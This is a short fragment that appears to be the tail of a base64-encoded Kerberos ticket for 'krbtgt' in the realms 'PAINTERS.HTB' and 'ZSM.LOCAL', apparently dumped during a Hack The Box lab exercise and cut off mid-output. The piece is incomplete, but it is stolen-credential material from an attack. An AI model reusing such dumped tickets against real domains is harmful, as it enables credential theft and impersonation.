gPMjAyNDA3MTAwMjU2MTVapxEYDzIwMjQwNzE2MTY1NjE1WqgOGwxQQUlOVEVSUy5IVEKpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCVpTTS5MT0NBTA== /nowrap
```

